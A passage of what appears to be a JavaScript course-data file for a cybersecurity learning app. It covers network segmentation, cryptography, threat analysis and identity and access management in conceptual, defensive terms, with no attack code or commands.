              "Network segmentation divides a network into smaller subnets (segments) to improve security and performance.\n\nBenefits:\n• Containment: Limits lateral movement of attackers\n• Reduced Attack Surface: Limits access to critical systems\n• Performance: Reduces congestion and improves speed\n• Compliance: Meets regulatory requirements for data isolation\n• Access Control: Easier to enforce policies between segments",
          },
          {
            id: "dmz",
            title: "DMZ (Demilitarized Zone)",
            content:
              "A DMZ is a network segment with controlled access between internal network and internet.\n\nDMZ Characteristics:\n• Hosts public-facing servers (web, email, DNS)\n• Restricted access from internal network\n• No direct access to internal servers\n• Usually protected by dual firewalls\n\nTraffic Flow:\nInternet → Firewall 1 → DMZ → Firewall 2 → Internal Network\n\nIf DMZ server compromised, attacker still cannot easily access internal network.",
          },
          {
            id: "vlan-segmentation",
            title: "VLAN-Based Segmentation",
            content:
              "Virtual LANs (VLANs) allow logical network segmentation on physical infrastructure.\n\nVLAN Benefits:\n• Cost-effective segmentation\n• Flexible network design\n• Easy to implement access control\n• Reduces broadcast domains\n\nCommon VLAN Design:\n• VLAN 1: Management\n• VLAN 10: Servers\n• VLAN 20: Workstations\n• VLAN 30: IoT/Printers\n• VLAN 100: Guest\n\nVLAN Trunking: Allows multiple VLANs over single link using 802.1Q tagging.",
          },
        ],
      },
    ],
  },
  {
    id: "cryptography-encryption",
    title: "Cryptography & Encryption",
    category: "Cryptography",
    difficulty: "Intermediate",
    description:
      "Encryption algorithms, PKI, digital certificates, hashing, and secure communication protocols.",
    estimatedTime: "5 hours",
    icon: Key,
    keyConceptsSummary:
      "Cryptography uses mathematical algorithms to protect data confidentiality, integrity, and authenticity. Includes symmetric encryption (same key), asymmetric encryption (public/private keys), and hashing (one-way functions).",
    sections: [
      {
        id: "encryption-basics",
        title: "1. Encryption Fundamentals",
        subsections: [
          {
            id: "symmetric-encryption",
            title: "Symmetric Encryption",
            content:
              "Symmetric encryption uses the SAME key for both encryption and decryption.\n\nCharacteristics:\n• Fast and efficient\n• Small key size (128, 256 bits)\n• Challenge: Key distribution and management\n• Suitable for bulk data encryption\n\nCommon Algorithms:\n• AES (Advanced Encryption Standard): 128, 192, or 256-bit keys. NIST standard. Used in SSL/TLS\n• DES (Data Encryption Standard): 56-bit key. DEPRECATED - no longer secure\n• 3DES: Triple DES, applies DES three times. Legacy system support\n• Blowfish: 64-bit block size, 32-448 bit key\n• ChaCha20: Modern stream cipher, used in TLS 1.3",
          },
          {
            id: "asymmetric-encryption",
            title: "Asymmetric Encryption",
            content:
              "Asymmetric encryption uses a PUBLIC key (encrypt) and PRIVATE key (decrypt).\n\nCharacteristics:\n• Slower than symmetric encryption\n• Larger key sizes (2048, 4096 bits)\n• Solves key distribution problem\n• Used for key exchange and digital signatures\n\nCommon Algorithms:\n• RSA: Most widely used, based on factorization difficulty. 2048+ bits recommended\n• ECC (Elliptic Curve Cryptography): Smaller keys with equivalent security (256-bit ECC ≈ 3072-bit RSA)\n• Diffie-Hellman: Key exchange protocol, not encryption itself",
          },
          {
            id: "encryption-modes",
            title: "Encryption Modes",
            content:
              "Block cipher modes determine how plaintext blocks are processed:\n\nECB (Electronic Codebook): Simple mode, same plaintext → same ciphertext. INSECURE - reveals patterns\n\nCBC (Cipher Block Chaining): Each block depends on previous. IV required. Secure but vulnerable to padding oracle attacks\n\nCTR (Counter): Converts block cipher to stream cipher. Parallelizable and secure\n\nGCM (Galois/Counter Mode): Provides encryption + authentication. Recommended for new systems\n\nCFB/OFB: Stream cipher modes, suitable for small data units",
          },
        ],
      },
      {
        id: "hashing-integrity",
        title: "2. Hashing & Integrity",
        subsections: [
          {
            id: "hash-functions",
            title: "Hash Functions",
            content:
              "Hash functions convert any input into fixed-size output (hash/digest).\n\nProperties:\n• One-way: Cannot reverse hash to get original data\n• Deterministic: Same input = same output\n• Avalanche Effect: Small input change = completely different hash\n• Collision Resistant: Two different inputs produce different hashes\n• Fast: Compute quickly\n\nApplications:\n• Data Integrity: Verify data hasn't changed\n• Password Storage: Store hashed passwords, not plaintext\n• Digital Signatures: Hash document then sign hash\n• Blockchain: Chain blocks together using hashes",
          },
          {
            id: "hash-algorithms",
            title: "Hash Algorithms",
            content:
              "MD5 (Message Digest 5): 128-bit output. DEPRECATED - collisions found, insecure\n\nSHA-1 (Secure Hash Algorithm 1): 160-bit output. DEPRECATED - collisions demonstrated\n\nSHA-2 Family: SHA-256, SHA-384, SHA-512. Current standard, secure\n\nSHA-3: Latest standard, based on Keccak. Greater security margin than SHA-2\n\nBcrypt: Specifically designed for passwords with salt and iterations\n\nArgon2: Modern password hashing, memory-hard to resist GPU attacks",
          },
          {
            id: "hmac",
            title: "HMAC (Hash-based Message Authentication Code)",
            content:
              "HMAC combines hash function with secret key to provide both authenticity and integrity.\n\nHow it works:\n• Combines message + secret key\n• Hash the combination\n• Receiver with same key can verify message wasn't tampered\n\nFormula: HMAC(K,M) = Hash((K⊕opad) || Hash((K⊕ipad) || M))\n\nCommon Use Cases:\n• API Authentication: HMAC header in API requests\n• Cookie Verification: Ensure cookies haven't been modified\n• Message Authentication in TLS: Verify message integrity\n• OAuth/JWT: Token validation",
          },
        ],
      },
      {
        id: "pki-certificates",
        title: "3. Public Key Infrastructure (PKI)",
        subsections: [
          {
            id: "pki-overview",
            title: "PKI Concepts",
            content:
              "Public Key Infrastructure manages digital certificates and public keys.\n\nPKI Components:\n• Certificate Authority (CA): Issues digital certificates\n• Registration Authority (RA): Verifies identities\n• Certificate Revocation List (CRL): List of revoked certificates\n• OCSP (Online Certificate Status Protocol): Real-time certificate status\n\nTrust Model:\n• Root CA: Self-signed, highest level of trust\n• Intermediate CA: Issued by Root CA\n• End-Entity Certificate: Issued to users/servers\n• Certificate Chain: Root → Intermediate → End-Entity",
          },
          {
            id: "digital-certificates",
            title: "Digital Certificates",
            content:
              "Digital certificates bind public keys to identities using digital signatures.\n\nX.509 Certificate Contents:\n• Subject: Who the certificate is for (Common Name, Org, Country)\n• Issuer: Which CA issued it\n• Public Key: The actual public key\n• Serial Number: Unique identifier\n• Valid From/To: Validity period (typically 1-3 years)\n• Signature Algorithm: Algorithm used to sign\n• Extensions: Additional info (key usage, extended validation)\n\nCertificate Types:\n• DV (Domain Validation): Verify domain ownership. Cheap, quick\n• OV (Organization Validation): Verify organization identity. More trust\n• EV (Extended Validation): Rigorous verification. Green address bar (mostly removed now)",
          },
          {
            id: "certificate-management",
            title: "Certificate Management",
            content:
              "Certificate Lifecycle:\n1. Generation: Create key pair\n2. Request: Submit CSR (Certificate Signing Request)\n3. Verification: CA verifies identity\n4. Issuance: CA signs and issues certificate\n5. Installation: Deploy on servers\n6. Renewal: Renew before expiry (usually 30-90 days)\n7. Revocation: If compromised or no longer needed\n\nCRL vs OCSP:\n• CRL: Large file, updated periodically, not real-time\n• OCSP: Real-time status, more current, but higher latency\n\nSelf-Signed Certificates:\n• Signed by themselves (not by CA)\n• No third-party trust\n• Useful for internal systems, testing, development\n• Browsers warn about self-signed certs",
          },
        ],
      },
      {
        id: "secure-protocols",
        title: "4. Secure Communication Protocols",
        subsections: [
          {
            id: "ssl-tls",
            title: "SSL/TLS",
            content:
              "SSL (Secure Sockets Layer) and TLS (Transport Layer Security) provide secure communication.\n\nHistory:\n• SSL 3.0: Original protocol (DEPRECATED)\n• TLS 1.0: Successor to SSL 3.0 (DEPRECATED)\n• TLS 1.1: Added protections (DEPRECATED)\n• TLS 1.2: Current standard, widely used\n• TLS 1.3: Latest, simplified handshake, faster\n\nTLS Handshake (simplified):\n1. Client Hello: Client offers cipher suites and TLS versions\n2. Server Hello: Server selects cipher suite and TLS version\n3. Certificate Exchange: Server sends certificate\n4. Key Exchange: Negotiate session key (RSA, DH, ECDH)\n5. Finished: Both sides verify handshake\n6. Data Encryption: All data encrypted with session key",
          },
          {
            id: "ipsec-protocol",
            title: "IPSec",
            content:
              "IPSec (Internet Protocol Security) provides network-layer encryption and authentication.\n\nComponents:\n• IKE (Internet Key Exchange): Negotiates security parameters\n• ESP (Encapsulating Security Payload): Encrypts and authenticates packets\n• AH (Authentication Header): Authenticates only (less common)\n\nModes:\n• Transport Mode: Encrypts payload only (end-to-end)\n• Tunnel Mode: Encrypts entire IP packet (site-to-site VPN)\n\nAdvantages:\n• Network-layer protection (all applications benefit)\n• VPN capable\n• Perfect Forward Secrecy possible\n\nDisadvantages:\n• Complex configuration\n• Higher overhead than TLS\n• Slower than application-layer encryption",
          },
          {
            id: "other-protocols",
            title: "Other Security Protocols",
            content:
              "SSH (Secure Shell): Remote login and data transfer. Uses asymmetric for auth, symmetric for data\n\nS/MIME: Email encryption using certificates\n\nPGP (Pretty Good Privacy): Email encryption, hybrid approach (asymmetric + symmetric)\n\nDTLS: DTLS is TLS for UDP (datagram)\n\nWireGuard: Modern VPN protocol, minimalist design, better performance\n\nQuic: New transport protocol with built-in encryption, 0-RTT resumption",
          },
        ],
      },
    ],
  },
  {
    id: "threat-analysis",
    title: "Threat Analysis & Assessment",
    category: "Threat Intelligence",
    difficulty: "Intermediate",
    description:
      "Malware types, attack vectors, threat modeling, vulnerability assessment, and risk analysis.",
    estimatedTime: "6 hours",
    icon: AlertTriangle,
    keyConceptsSummary:
      "Understanding threats involves identifying malware types, analyzing attack vectors, modeling potential threats, and assessing vulnerabilities. Critical for building effective defenses.",
    sections: [
      {
        id: "malware-types",
        title: "1. Malware Types & Characteristics",
        subsections: [
          {
            id: "malware-basics",
            title: "Malware Categories",
            content:
              "Malware is malicious software designed to cause harm.\n\nViruses:\n• Requires host program to execute\n• Spreads via file sharing, email, USB\n• Self-replicating\n• Payload: Steal data, corrupt files, display messages\n\nWorms:\n• Self-replicating without host\n• Exploits network vulnerabilities\n• Spreads automatically\n• Examples: Conficker, Stuxnet\n\nTrojans:\n• Appears legitimate, contains hidden malware\n• Requires user execution\n• Creates backdoor access\n• Examples: Zeus banking trojan\n\nRootkits:\n• Runs with system privileges\n• Hides from detection\n• Difficult to remove\n• Can compromise entire OS",
          },
          {
            id: "advanced-malware",
            title: "Advanced Malware",
            content:
              "Ransomware:\n• Encrypts files/systems\n• Demands payment for decryption key\n• Examples: WannaCry, Ryuk\n• Prevention: Backups, patching, education\n\nAdware:\n• Displays unwanted advertisements\n• Can track user behavior\n• Often bundled with free software\n\nSpyware:\n• Secretly collects user information\n• Keyloggers, screen recorders\n• Violates privacy\n\nBotnet:\n• Infected computers (zombies) controlled remotely\n• Used for DDoS, spam, mining\n• Command and Control (C&C) infrastructure",
          },
          {
            id: "detection-prevention",
            title: "Malware Detection & Prevention",
            content:
              "Signature-Based Detection:\n• Matches malware signatures in database\n• Effective for known malware\n• Cannot detect zero-days\n• Fast detection\n\nHeuristic Detection:\n• Analyzes behavior and code structure\n• Detects variants and unknown malware\n• More false positives\n• Slower than signature detection\n\nBehavioral Detection:\n• Monitors runtime behavior\n• Detects execution of malicious actions\n• Works on unknown malware\n• Can have false positives\n\nSandbox Analysis:\n• Execute in isolated environment\n• Observe behavior safely\n• Time-consuming but thorough",
          },
        ],
      },
      {
        id: "attack-vectors",
        title: "2. Attack Vectors & Techniques",
        subsections: [
          {
            id: "social-engineering",
            title: "Social Engineering Attacks",
            content:
              "Phishing:\n• Fraudulent emails/websites mimicking legitimate sources\n• Trick users to provide credentials\n• Largest attack vector\n• 90%+ of breaches start with phishing\n\nSpear Phishing:\n• Targeted at specific individuals\n• Personalized information used\n• Higher success rate\n• More effort but better results\n\nVishing (Voice Phishing):\n• Phishing via phone calls\n• Social engineer pretends to be authority\n• Request sensitive information\n\nPretexting:\n• Create false scenario to trick victim\n• Establish false credibility\n• Extract information or access\n\nBaiting:\n• Offer something enticing (USB, prize)\n• Contains malware\n• Exploits curiosity",
          },
          {
            id: "network-attacks",
            title: "Network-Based Attacks",
            content:
              "DDoS (Distributed Denial of Service):\n• Overwhelm target with traffic from multiple sources\n• Botnet used to amplify attack\n• Prevents legitimate users from accessing service\n• Mitigation: Rate limiting, CDN, ISP filtering\n\nMan-in-the-Middle (MITM):\n• Intercept communication between two parties\n• Can eavesdrop or modify messages\n• SSL/TLS prevents this\n• ARP spoofing, DNS spoofing techniques\n\nDNS Poisoning:\n• Corrupt DNS cache with false mappings\n• Redirect to malicious sites\n• Affects all users with corrupted cache\n\nPassword Attacks:\n• Brute Force: Try all combinations\n• Dictionary Attack: Try common passwords\n• Rainbow Tables: Pre-computed hash tables\n• Credential Stuffing: Use leaked credentials elsewhere",
          },
          {
            id: "exploitation",
            title: "Exploitation Techniques",
            content:
              "Zero-Day Exploits:\n• Attack unknown vulnerability (not patched)\n• Attacker has exclusive knowledge\n• Most dangerous\n• Usually sold on dark web\n\nSQL Injection:\n• Inject SQL code into input fields\n• Bypass authentication\n• Steal/modify database data\n• Prevention: Input validation, parameterized queries\n\nXSS (Cross-Site Scripting):\n• Inject malicious scripts into web pages\n• Stored XSS: Permanently stored\n• Reflected XSS: Reflected in URL/request\n• Prevention: Input sanitization, CSP headers\n\nBuffer Overflow:\n• Overflow buffer to overwrite memory\n• Execute arbitrary code\n• ASLR and DEP mitigations reduce risk",
          },
        ],
      },
      {
        id: "threat-modeling",
        title: "3. Threat Modeling",
        subsections: [
          {
            id: "threat-models",
            title: "Threat Modeling Approaches",
            content:
              "STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege):\n• Identify threats in each category\n• Systematic approach\n• Good for comprehensive analysis\n\nATT&CK Framework:\n• Matrix of adversary tactics and techniques\n• Based on real attack observations\n• Excellent for threat hunting\n• Used by security professionals globally\n\nKill Chain:\n• Identifies attack stages: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions\n• Helps understand attack progression\n• Identify defensive opportunities",
          },
          {
            id: "threat-assessment",
            title: "Threat Assessment Process",
            content:
              "Asset Identification:\n• Identify valuable assets\n• Data, systems, applications\n• Criticality rating\n\nThreat Identification:\n• What threats could affect assets?\n• Internal and external threats\n• Intentional and accidental\n\nVulnerability Analysis:\n• What weaknesses exist?\n• Could be in people, processes, or technology\n• Severity assessment\n\nRisk Calculation:\n• Risk = Threat × Vulnerability × Asset Value\n• Prioritize remediation efforts\n• Resource allocation",
          },
          {
            id: "threat-intelligence",
            title: "Threat Intelligence",
            content:
              "Types of Intelligence:\n• Strategic: Long-term trends, industry impacts\n• Tactical: Specific attack techniques, IOCs\n• Operational: Immediate threat information\n\nData Sources:\n• Open Source Intelligence (OSINT)\n• Dark web monitoring\n• Threat feeds (Shodan, AlienVault OTX)\n• Information sharing organizations\n\nIntelligence-Driven Defense:\n• Use threat intelligence to inform defense strategy\n• Prioritize based on likely threats\n• Continuous improvement\n• Stay ahead of attackers",
          },
        ],
      },
      {
        id: "vulnerability-assessment",
        title: "4. Vulnerability Assessment & Scanning",
        subsections: [
          {
            id: "vulnerability-scanning",
            title: "Vulnerability Scanning",
            content:
              'Automated Tools:\n• Nessus: Industry standard, comprehensive\n• OpenVAS: Open source alternative\n• Qualys: Cloud-based scanning\n• Rapid7 Nexpose/InsightVM\n\nScan Types:\n• Credentialed Scan: With system access (more thorough)\n• Non-Credentialed Scan: Without access (realistic external view)\n• Web Application Scan: Specific to web apps\n• Compliance Scan: Check against standards (PCI-DSS, HIPAA)\n\nFalse Positives:\n• Scanning reports vulnerabilities that don\'t actually exist\n• Require manual verification\n• Create "alert fatigue" if ignored\n• Prioritize critical/high severity',
          },
          {
            id: "penetration-testing",
            title: "Penetration Testing",
            content:
              "Process:\n1. Reconnaissance: Gather information\n2. Scanning: Identify open ports/services\n3. Enumeration: Identify usernames, shares, services\n4. Exploitation: Attempt to gain access\n5. Post-Exploitation: Maintain access, gather data\n6. Reporting: Document findings and recommendations\n\nScope Definition:\n• White Box: Attacker has full information\n• Gray Box: Limited information\n• Black Box: No information (most realistic)\n• Rules of Engagement: What is/isn't allowed\n• Legal Authorization: Written permission required!\n\nTools:\n• Metasploit: Exploitation framework\n• Burp Suite: Web application testing\n• Kali Linux: Penetration testing distribution",
          },
          {
            id: "remediation",
            title: "Vulnerability Remediation",
            content:
              "Prioritization:\n• Risk Rating: CVSS score × Asset criticality\n• Exploitability: How easy to exploit\n• Impact: What damage would occur\n• Compensating Controls: Existing mitigations\n\nRemediation Strategies:\n• Patching: Update software\n• Configuration: Change settings\n• Compensating: Implement controls (WAF, monitoring)\n• Decommission: Remove if not needed\n• Accept: If cost of fix > risk\n\nTracking:\n• SLA for remediation (e.g., Critical: 24 hours)\n• Verification that fix worked\n• Regression testing\n• Documentation for audit",
          },
        ],
      },
    ],
  },
  {
    id: "identity-access-management",
    title: "Identity & Access Management",
    category: "IAM",
    difficulty: "Intermediate",
    description:
      "Authentication methods, authorization models, MFA, SSO, LDAP, and privilege management.",
    estimatedTime: "4 hours",
    icon: Users,
    keyConceptsSummary:
      "IAM manages who can access what resources. Involves authentication (verifying identity), authorization (granting permissions), and access control (enforcing policies).",
    sections: [
      {
        id: "authentication",
        title: "1. Authentication Methods",
        subsections: [
          {
            id: "password-auth",
            title: "Password Authentication",
            content:
              "Something You Know: Password\n• Most common method\n• Weak: Many users choose weak passwords\n• Subject to: Brute force, dictionary attacks, credential stuffing\n• Phishing vulnerable\n\nPassword Security Best Practices:\n• Minimum length: 12+ characters\n• Complexity: Mix of cases, numbers, symbols\n• No dictionary words\n• No personal information\n• Unique per system\n• Changed regularly (controversial - NIST now recommends not forcing change)\n• Not reused\n\nPassword Storage:\n• NEVER store plaintext\n• Hash with salt: Hash(password + random salt)\n• Slow hashes: bcrypt, Argon2 (resist GPU attacks)\n• Iteration count: Higher = slower but more secure",
          },
          {
            id: "mfa-biometric",
            title: "Multi-Factor Authentication (MFA)",
            content:
              "Something You Know: Password\n• Knowledge-based (easiest to compromise)\n\nSomething You Have: Token/Device\n• Hardware token (RSA SecurID)\n• Mobile app (Google Authenticator, Duo)\n• SMS code (weakest form - SIM swapping)\n• Email code\n\nSomething You Are: Biometric\n• Fingerprint (FTS devices, phones)\n• Facial recognition (FaceID, FaceTime)\n• Iris scan\n• Voice recognition\n• Unique and hard to fake\n\nSomewhere You Are: Location\n• GPS location\n• IP address\n• Time zone\n\nBest Practices:\n• Combine different factors\n• Not two of same factor type (password + answer = 1 factor)\n• 2FA minimum (2 factors)\n• MFA (2+ factors) recommended",
          },
          {
            id: "sso-federation",
            title: "Single Sign-On (SSO)",
            content:
              'SSO Concept:\n• Authenticate once, access multiple systems\n• Improves user experience\n• Central authentication\n• Examples: Microsoft Entra ID, Okta, Google Workspace\n\nSSO Protocols:\n• SAML 2.0: XML-based, enterprise standard\n  - Assertion: Claims about user identity\n  - Service Provider (SP): Application needing auth\n  - Identity Provider (IdP): Authenticates user\n  - XML signed and encrypted\n\n• OAuth 2.0: API authorization, not authentication\n  - Delegate access without sharing password\n  - Used for "Login with Google/Facebook"\n  - Access tokens, refresh tokens\n\n• OpenID Connect: OAuth 2.0 + authentication\n  - Adds identity layer to OAuth\n  - ID tokens, UserInfo endpoint\n  - Combines benefits of both',
          },
        ],
      },
      {
        id: "authorization",
        title: "2. Authorization & Access Control",
        subsections: [
          {
            id: "access-control-models",
            title: "Access Control Models",
            content:
              "DAC (Discretionary Access Control):\n• Owner controls access to resources\n• User can grant/revoke permissions\n• Flexible but less secure\n• File systems (Windows, Linux)\n• User can share file with others\n\nMAC (Mandatory Access Control):\n• Central policy defines access\n• Users cannot change permissions\n• Very restrictive\n• Military/government systems\n• Example: SELinux\n\nRBAC (Role-Based Access Control):\n• Users assigned to roles\n• Roles have permissions\n• Easier to manage\n• Enterprise systems\n• Example: Admin role → Read/Write/Delete\n\nABAC (Attribute-Based Access Control):\n• Access based on attributes\n• More granular than RBAC\n• Attributes: User (department), Resource (classification), Environment (time, location)\n• Example: (Department=Finance AND Classification=Confidential AND Time=BusinessHours)",
          },
          {
            id: "privilege-management",
            title: "Privilege Escalation Prevention",
            content:
              "Vertical Escalation:\n• Non-admin gains admin rights\n• More common\n• Example: Buffer overflow to gain root\n• Prevention: Input validation, DEP/ASLR, least privilege\n\nHorizontal Escalation:\n• Access another user's data at same privilege level\n• Example: One customer views another's data\n• Prevention: Proper authorization checks\n\nLeast Privilege Principle:\n• Users get minimum permissions needed\n• Reduces damage if account compromised\n• Regular access reviews\n• Remove unnecessary permissions\n\nSeperation of Duties:\n• Different users do different steps\n• Prevents fraud\n• Example: One approves purchase, another pays\n• Prevents single person from unauthorized actions",
          },
          {
            id: "access-control-lists",
            title: "Access Control Lists (ACLs)",
            content:
              "ACL Components:\n• Subject: Who (user, group, process)\n• Object: What (file, printer, network resource)\n• Permissions: What can be done (Read, Write, Execute, Delete)\n• Scope: Where applies (this object only or children)\n\nNetwork ACLs:\n• Control traffic between networks\n• Source/Destination IP\n• Port/Protocol\n• Allow/Deny action\n• Usually deny by default\n• Order matters (first match wins)\n\nFile System ACLs:\n• Control file access\n• Explicit Allow/Deny entries\n• Inherited from parent folders\n• Can override inheritance\n• More powerful than permissions (R, W, X)\n\nBest Practices:\n• Review regularly\n• Remove old/unused entries\n• Group permissions when possible\n• Document reasons for access\n• Audit changes",
          },
        ],
      },
      {
        id: "directory-services",
        title: "3. Directory Services",
        subsections: [
          {
            id: "ldap",
            title: "LDAP (Lightweight Directory Access Protocol)",
            content:
              "LDAP Basics:\n• Network protocol for accessing directory services\n• Central repository of user and resource info\n• Hierarchical structure (tree)\n• Distinguished Names (DN): cn=user,ou=sales,dc=example,dc=com\n\nLDAP Operations:\n• Bind: Authenticate to directory\n• Search: Query directory\n• Add/Delete/Modify: CRUD operations\n• Unbind: Close connection\n\nLDAP Uses:\n• User authentication (many systems support LDAP)\n• Address books\n• Employee directories\n• Printer access control\n• Phone system integration\n\nLDAP Security:\n• StartTLS: Encrypt connection\n• Simple Bind: Username/password\n• SASL: More secure authentication\n• ACLs: Control who can read/modify",
          },
          {
            id: "active-directory",
            title: "Active Directory (AD)",
            content:
              "What is AD:\n• Microsoft's implementation of directory services\n• Central management of users, computers, resources\n• Integrated with Windows\n• Enterprise standard\n\nAD Components:\n• Domain: Group of computers sharing trust\n• Forest: Collection of domains\n• Organizational Unit (OU): Hierarchical containers\n• Group Policy: Apply settings to users/computers\n• Domain Controller: Hosts AD database\n\nAD Security Features:\n• Kerberos: Authentication protocol\n• Group Policies: Centralized config\n• Fine-grained password policies\n• Audit logging\n• Delegation: Limit admin rights\n\nAD Attacks:\n• Credential harvesting from LSASS memory\n• Golden Ticket: Forge Kerberos ticket\n• Kerberoasting: Crack service account passwords\n• Pass-the-Hash: Use NTLM hash to authenticate\n• Mitigation: MFA, privilege limiting, monitoring",
          },
          {
            id: "identity-federation",
            title: "Identity Federation",
            content:
              "Federation Concept:\n• Trust relationship between organizations\n• One IdP authenticates for multiple SPs\n• Enables single identity across domains\n• Cross-organization collaboration\n\nFederation Components:\n• Identity Provider (IdP): Authenticates users\n• Service Provider (SP): Offers service\n• Trust Relationship: Agreement between IdP and SP\n• Federation Metadata: Technical details\n\nUse Cases:\n• B2B collaborations\n• Cloud service SSO\n• Multi-company mergers\n• Government systems\n• Academic institutions (Shibboleth)\n\nSecurity Considerations:\n• Verify Federation Metadata\n• Certificate validation\n• Attribute encryption\n• Audit federation events\n• Principle of least trust",
          },
        ],
      },
      {
        id: "account-management",
        title: "4. Account Management & Lifecycle",
        subsections: [
          {
            id: "account-provisioning",
            title: "Account Provisioning & Deprovisioning",
            content:
              "Provisioning (Creating Accounts):\n• User needs access to systems\n• Create accounts, assign permissions\n• Usually manual or workflow-based\n• Automation: Identity governance systems\n\nDeprovisioning (Removing Access):\n• User leaves company/role\n• Remove accounts and permissions\n• Often overlooked, security risk\n• Should be immediate upon termination\n• Offboarding checklist: Email, VPN, systems, physical access\n\nAccessibility Management:\n• Periodic Access Reviews: Ensure users still need access\n• Principle of Least Privilege: Remove unnecessary access\n• Ownership: Managers verify their team's access\n• Compliance: Regulatory requirements (SOX, HIPAA)\n\nAutomation Benefits:\n• Faster provisioning\n• Consistent application\n• Audit trail\n• Reduces human error",
          },
          {
            id: "password-management",
            title: "Password Management",
            content:
              "Password Managers:\n• Encrypted storage of passwords\n• Generate strong random passwords\n• Auto-fill passwords\n• Reduces password reuse\n• Examples: 1Password, LastPass, Bitwarden\n\nEnterprise Solutions:\n• Privileged Access Management (PAM)\n• Rotate passwords automatically\n• Shared account credentials\n• Audit access to credentials\n• Examples: CyberArk, HashiCorp Vault\n\nPassword Synchronization:\n• Same password across systems\n• Not recommended (if one compromised, all are)\n• Better: Unique strong passwords\n• Use password manager instead\n\nPassword Reset:\n• User forgets password\n• Security questions (weak, personal info findable)\n• Email verification (better)\n• MFA confirmation (best)\n• Admin reset (verify identity first)\n• Avoid: Knowledge-based questions alone",
          },
          {
            id: "privilege-elevation",
            title: "Privileged Access Management (PAM)",
            content:
              "What is PAM:\n• Control and monitor privileged accounts\n• Track who used what credentials and when\n• Reduce standing privileges\n• Minimize damage if account compromised\n\nCore Functions:\n• Just-in-Time (JIT) Access: Grant temporary elevated access\n• Just-Enough-Privilege (JEP): Grant minimal permissions needed\n• Session Recording: Record admin activities\n• MFA for Privilege: Require MFA for admin access\n• Password Vault: Secure storage of service accounts\n\nImplementation:\n• Dedicated admin accounts (separate from regular accounts)\n• Separate admin workstations (clean devices)\n• Time-limited admin access\n• Frequent password rotation\n• Audit and alert on privilege use\n\nBest Practices:\n• No shared credentials\n• Service accounts for automation\n• Separate roles (change mgmt vs read-only)\n• Sunset unused accounts\n• Regular reviews of admin access",
          },
        ],
      },
    ],
  },
];
